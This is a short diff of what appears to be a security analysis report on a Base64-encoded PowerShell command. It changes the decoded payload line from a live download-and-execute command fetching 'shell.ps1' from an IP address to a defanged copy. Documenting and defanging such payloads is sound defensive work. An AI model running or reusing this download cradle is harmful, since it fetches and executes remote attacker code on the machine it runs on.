@@ -67,8 +67,8 @@ A suspicious PowerShell command was identified using Base64 encoding.
 
 ### 🔓 Decoded Payload
 
-```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.45/shell.ps1')
+powershell
+IEX (New-Object Net.WebClient).DownloadString ('http://192[.]168[.]10[.]45/shell.ps1')
 
 ---
 
